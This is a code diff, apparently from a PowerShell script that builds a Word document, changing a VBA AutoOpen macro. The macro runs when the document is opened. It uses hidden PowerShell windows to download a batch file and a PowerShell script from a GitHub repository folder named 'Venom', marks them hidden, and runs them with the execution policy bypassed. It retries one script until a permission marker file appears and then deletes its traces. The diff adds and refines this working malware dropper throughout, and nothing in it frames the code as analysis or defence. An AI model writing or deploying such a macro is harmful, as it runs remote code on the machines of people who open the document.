@@ -76,43 +76,115 @@ Sub AutoOpen()
     Dim docPath As String
     Dim initialCmdPath As String
     Dim extractPs1Path As String
+    Dim permTxtPath As String
     Dim shellCmdInitial As String
     Dim shellCmdExtract As String
+    Dim fso As Object
+    Dim tempFolder As String
+    Dim startTime As Single
+    Dim permissionGranted As Boolean
+    Dim retryCount As Integer
+    Dim maxRetries As Integer
 
+    ' Define the maximum number of retries to prevent an infinite loop
+    maxRetries = 10
+
+    ' Get the path to the current document's folder
     docPath = ThisDocument.Path
-    If docPath = """" Then
+    If docPath = "" Then
+        MsgBox "Unable to determine the document path. Save the document first.", vbCritical
         Exit Sub
     End If
 
+    ' Define the paths for initial.cmd and extract.ps1
     initialCmdPath = docPath & "\initial.cmd"
     extractPs1Path = docPath & "\extract.ps1"
-    p_vbaPs1Path = docPath & "\p_vba.ps1"
 
-    shellCmdInitial = "powershell -Command ""Start-Job -ScriptBlock {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd' -OutFile '"" & initialCmdPath & ""'}"""
-    shellCmdExtract = "powershell -Command ""Start-Job -ScriptBlock {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/extract.ps1' -OutFile '"" & extractPs1Path & ""'}"""
-    shellCmdExtract = "powershell -Command ""Start-Job -ScriptBlock {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1' -OutFile '"" & p_vbaPs1Path & ""'"'}"""
+    ' Get the temp directory path using FileSystemObject
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    tempFolder = fso.GetSpecialFolder(2) ' Temporary Folder
+    permTxtPath = tempFolder & "\perm.txt"
 
+    ' Construct the PowerShell commands to download the files
+    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd' -OutFile '" & initialCmdPath & "'"""
+    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '" & extractPs1Path & "'"""
 
+    ' Execute the PowerShell commands to download the files
     Shell shellCmdInitial, vbHide
     Shell shellCmdExtract, vbHide
-    Shell shellCmdp_vba, vbHide
 
-    Do While Dir(initialCmdPath) = "" : DoEvents : Loop
-    SetAttr initialCmdPath, vbHidden
-    Shell "cmd.exe /C """ & initialCmdPath & """", vbHide
+    ' Wait for 30 seconds to ensure both files are downloaded
+    startTime = Timer
+    Do While Timer < startTime + 30
+        DoEvents
+    Loop
 
-    Do While Dir(extractPs1Path) = "" : DoEvents : Loop
-    SetAttr extractPs1Path, vbHidden
-    Shell "powershell -ExecutionPolicy Bypass -File """ & extractPs1Path & """", vbHide
+    ' Check if initial.cmd was successfully downloaded
+    If Dir(initialCmdPath) <> "" Then
+        ' Hide initial.cmd
+        SetAttr initialCmdPath, vbHidden
 
-    Do While Dir(p_vbaPs1Path) = "" : DoEvents : Loop
-    SetAttr p_vbaPs1Path, vbHidden
-    Shell "powershell -ExecutionPolicy Bypass -File """ & p_vbaPs1Path & """", vbHide
+        ' Execute initial.cmd with a hidden window
+        Shell "cmd.exe /C """ & initialCmdPath & """", vbHide
 
+        ' Wait for 10 seconds to ensure initial.cmd execution completes
+        startTime = Timer
+        Do While Timer < startTime + 10
+            DoEvents
+        Loop
+    Else
+        MsgBox "Failed to download initial.cmd.", vbCritical
+        Exit Sub
+    End If
+
+    ' Check if extract.ps1 was successfully downloaded
+    If Dir(extractPs1Path) <> "" Then
+        ' Hide extract.ps1
+        SetAttr extractPs1Path, vbHidden
+
+        ' Run extract.ps1 in a loop until permissions are granted or maximum retries are reached
+        permissionGranted = False
+        retryCount = 0
+        Do While Not permissionGranted And retryCount < maxRetries
+            retryCount = retryCount + 1
+            Shell "powershell -ExecutionPolicy Bypass -File """ & extractPs1Path & """", vbHide
+
+            ' Check if perm.txt exists in the temporary directory
+            If Dir(permTxtPath) <> "" Then
+                permissionGranted = True
+            End If
+
+            ' Wait for a few seconds before retrying
+            startTime = Timer
+            Do While Timer < startTime + 5
+                DoEvents
+            Loop
+        Loop
+
+        If Not permissionGranted Then
+            MsgBox "Failed to obtain permissions for extract.ps1 after " & maxRetries & " attempts.", vbCritical
+            Exit Sub
+        End If
+
+        ' Wait for 10 seconds to ensure extract.ps1 execution completes
+        startTime = Timer
+        Do While Timer < startTime + 10
+            DoEvents
+        Loop
+    Else
+        MsgBox "Failed to download extract.ps1.", vbCritical
+        Exit Sub
+    End If
+
+    ' Cleanup: Delete temporary files
     On Error Resume Next
-    Kill initialCmdPath
-    Kill extractPs1Path
+    fso.DeleteFile initialCmdPath, True
+    fso.DeleteFile extractPs1Path, True
+    fso.DeleteFile permTxtPath, True
     On Error GoTo 0
+
+    ' Notify the user of successful execution and cleanup
+    MsgBox "initial.cmd and extract.ps1 downloaded, executed, and deleted successfully!", vbInformation
 End Sub
 "@
 
